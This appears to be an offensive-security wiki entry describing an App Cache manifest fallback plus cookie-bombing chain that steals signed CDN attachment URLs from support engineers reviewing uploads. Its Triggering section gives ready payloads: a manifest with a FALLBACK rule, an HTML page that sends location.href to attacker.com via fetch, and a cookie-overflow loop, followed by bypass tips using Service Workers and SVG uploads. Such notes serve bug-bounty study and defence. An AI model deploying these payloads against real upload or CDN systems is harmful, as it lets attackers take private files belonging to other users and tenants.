---
title: App Cache manifest fallback + cookie-bombing exfil chain
slug: appcache-cookie-bomb-chain
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/exfil, technique/appcache, sink/cdn-signed-url]
inbound: []
---

# App Cache manifest fallback + cookie-bombing exfil chain

## Pattern

A multi-stage exfil chain that targets a workflow where a support
engineer (or any authenticated reviewer) clicks through user-uploaded
attachments served from a per-tenant CDN bucket. Each attachment URL
contains a one-shot signed key — leaking the URL = leaking the file.

Stage 1 — Attacker uploads three files into the same CDN directory as
the victim's future uploads (often allowed if directory is shared per
support ticket or per tenant):

1. An **App Cache manifest** (`.appcache`, MIME
   `text/cache-manifest`). The manifest declares a `FALLBACK:` rule
   pointing every path in that directory to one of the attacker's
   uploaded HTML files.
2. The **fallback HTML** — runs `fetch(window.location.href)` and
   posts the URL (including the signed key) to attacker server.
3. A **cookie-bomb HTML page** — when the engineer opens it, it
   `document.cookie = 'a=' + 'x'.repeat(...)` repeatedly until the
   browser's cookie jar overflows for that origin. Subsequent requests
   to the CDN host fail with `400 Bad Request` (header too large) —
   the original asset becomes inaccessible, which fires the manifest
   `FALLBACK:` rule.

Stage 2 — When the engineer next clicks any *other* user's attachment
in the same directory, the browser short-circuits to the fallback
HTML, which exfils the signed URL of that file. Attacker downloads it
out-of-band.

Researcher: Aaron Costello (idea seeded from filedescriptor's
App Cache writeup; combined with cookie-bombing by Costello on a 2020
Salesforce bug).

## Preconditions

- Files in the same CDN directory share a single App Cache scope.
- Attacker can upload an `.appcache` and HTML files with permissive
  Content-Types (no MIME enforcement at upload).
- Victim browser supports App Cache (deprecated but still works on
  older Chromium and most enterprise-locked browsers).
- Cookie-jar overflow is reachable for the target origin (no
  `__Host-` rejection at upload time).

## Detection

- Upload a `.appcache` and confirm the response Content-Type is
  `text/cache-manifest` or the browser parses it as such.
- Confirm files in the directory share scope (browser fires manifest
  on second-file fetch).

## Triggering

`evil.appcache`:
```
CACHE MANIFEST
FALLBACK:
/ /attacker-uploaded-fallback.html
```

`attacker-uploaded-fallback.html`:
```html
<!doctype html>
<script>
fetch('https://attacker.com/log?url=' + encodeURIComponent(location.href));
</script>
```

`cookie-bomb.html` (opened first to deny the original asset):
```html
<script>
for (let i=0;i<500;i++) document.cookie = `a${i}=${'x'.repeat(4000)}; path=/`;
</script>
```

Engineer flow: clicks attacker-uploaded HTML (cookie bomb fires) →
clicks any other attachment → 400 from CDN → manifest fallback fires →
attacker's HTML runs in the CDN origin and exfils the signed URL.

## Bypasses

- App Cache is deprecated but still available in many enterprise
  browsers; Service Workers can be substituted (`fetch` event handler
  intercepts the request).
- If the CDN rejects unknown MIME on upload, try `image/svg+xml` —
  SVGs are HTML in disguise and can host fetch.

## Seen in the wild

- {date: 2020-circa, target: undisclosed travel co, source: CT Ep 108} — Aaron
  Costello: Salesforce-hosted support-ticket file-upload feature; the
  CDN bucket was shared across all customers and engineer-triage
  workflow made the second-click trigger reliable.

## References

- filedescriptor — App Cache manifest writeup
- Critical Thinking Podcast Ep 108
- Related: [[../server-side/web-cache-deception]] (different layer, similar exfil shape)
